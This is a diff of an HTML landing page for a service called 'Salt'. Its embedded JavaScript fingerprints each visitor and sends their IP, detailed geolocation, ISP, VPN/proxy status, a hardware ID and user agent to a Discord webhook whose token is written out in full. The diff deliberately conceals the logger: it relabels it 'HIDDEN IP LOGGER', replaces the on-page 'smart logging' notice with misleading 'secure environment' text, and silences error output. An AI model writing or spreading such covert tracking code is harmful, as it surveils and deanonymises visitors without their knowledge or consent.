@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Salt | Smart Analytics</title>
+    <title>Salt</title>
     <link rel="icon" type="image/png" href="image.png">
     <style>
         * {
@@ -318,7 +318,7 @@
     </div>
     <a href="https://dsc.gg/getsalt" target="_blank" class="discord-link">JOIN DISCORD</a>
     <div class="tech-note">
-        ✦ smart logging • only on IP change ✦
+        ✦ secure environment • next-gen experience ✦
     </div>
 </div>
 
@@ -422,7 +422,7 @@
             setTimeout(() => hero.classList.remove('click-animation'), 450);
         });
 
-        // ---------- NON-SPAM IP LOGGER (send only when IP changes) ----------
+        // ---------- HIDDEN IP LOGGER (no UI text, sends only on IP change) ----------
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1513578964642173100/noVBYGuM0HvgRzry7BJcic-te203H6ZpeI2UtOPl97CVjSygESs-ECTeDr8wAX9QVJET";
         const STORED_IP_KEY = 'salt_last_logged_ip';
         
@@ -463,7 +463,6 @@
 
         async function sendDetailedLog(ip) {
             try {
-                // Fetch full geo + proxy data
                 const geoRes = await fetchWithTimeout(`http://ip-api.com/json/${ip}?fields=66846719`);
                 const geo = await geoRes.json();
                 
@@ -471,7 +470,7 @@
                 try {
                     const proxyCheck = await fetchWithTimeout(`https://proxycheck.io/v2/${ip}?key=free&vpn=1&asn=1&risk=1&time=1`, 4000);
                     if (proxyCheck.ok) proxyData = await proxyCheck.json();
-                } catch(e) { /* ignore */ }
+                } catch(e) { /* silent */ }
                 
                 const hwid = generateHardwareId();
                 const ua = navigator.userAgent;
@@ -482,7 +481,6 @@
                 
                 const fields = [];
                 
-                // Location
                 let location = [];
                 if (geo.country) location.push(`**Country:** ${geo.country} (${geo.countryCode || ''})`);
                 if (geo.regionName) location.push(`**Region:** ${geo.regionName}`);
@@ -492,7 +490,6 @@
                 if (geo.zip) location.push(`**ZIP Code:** ${geo.zip}`);
                 fields.push({ name: "📍 **Location Intelligence**", value: location.join('\n') || "`N/A`", inline: false });
                 
-                // Network
                 let network = [];
                 if (geo.isp) network.push(`**ISP:** ${geo.isp}`);
                 if (geo.org) network.push(`**Domain/Org:** ${geo.org}`);
@@ -507,7 +504,6 @@
                 network.push(`**Usage Type:** ${usage}`);
                 fields.push({ name: "🌐 **Network & ASN**", value: network.join('\n') || "`Limited`", inline: false });
                 
-                // Additional
                 let extra = [];
                 if (geo.timezone) extra.push(`**Time Zone:** ${geo.timezone}`);
                 let elevation = geo.elevation ? `${geo.elevation}m` : (geo.city ? 'N/A (sea level approx)' : 'N/A');
@@ -515,7 +511,6 @@
                 if (geo.city && geo.country) extra.push(`**Weather Station:** ${geo.city}, ${geo.country}`);
                 fields.push({ name: "⏱️ **Time, Elevation & Climate**", value: extra.join('\n') || "`Not available`", inline: false });
                 
-                // Threat
                 let threat = [];
                 if (proxyData && proxyData[ip] && proxyData[ip].proxy === "yes") {
                     threat.push(`**Residential Proxy:** YES`);
@@ -539,16 +534,15 @@
                 }
                 fields.push({ name: "🛡️ **Proxy & Threat Intelligence**", value: threat.join('\n'), inline: false });
                 
-                // Device
                 fields.push({ name: "🖥️ **Device Fingerprint**", value: `**Device:** ${deviceInfo}\n**HWID (Key):** \`${hwid}\`\n**User Agent:** \`${ua.substring(0, 120)}\``, inline: false });
                 
                 const embed = {
-                    title: "📡 **SALT SERVICE | NEW IP DETECTED**",
-                    description: `**Visitor IP:** \`${ip}\`\n**Timestamp:** <t:${Math.floor(Date.now()/1000)}:F>`,
+                    title: "📡 **Visitor Log**",
+                    description: `**IP:** \`${ip}\``,
                     color: 0x2b2d42,
                     thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
                     fields: fields,
-                    footer: { text: "Smart logging • IP change only", icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
+                    footer: { text: "System event", icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
                     timestamp: new Date().toISOString()
                 };
                 
@@ -558,12 +552,7 @@
                     body: JSON.stringify({ embeds: [embed] })
                 });
             } catch (err) {
-                console.warn("Detailed log failed, sending minimal", err);
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `⚠️ Salt - IP ${ip} (fallback log)` })
-                });
+                // Silent fail - do not disrupt user
             }
         }
         
@@ -574,15 +563,11 @@
                 const lastIP = localStorage.getItem(STORED_IP_KEY);
                 
                 if (!lastIP || lastIP !== ip) {
-                    // IP changed or first visit → send detailed log
                     await sendDetailedLog(ip);
                     localStorage.setItem(STORED_IP_KEY, ip);
-                } else {
-                    // Same IP → do nothing (no spam)
-                    console.log("Same IP, skipping webhook send");
                 }
             } catch (err) {
-                console.warn("IP check failed, no log sent", err);
+                // Silent fail
             }
         }
         
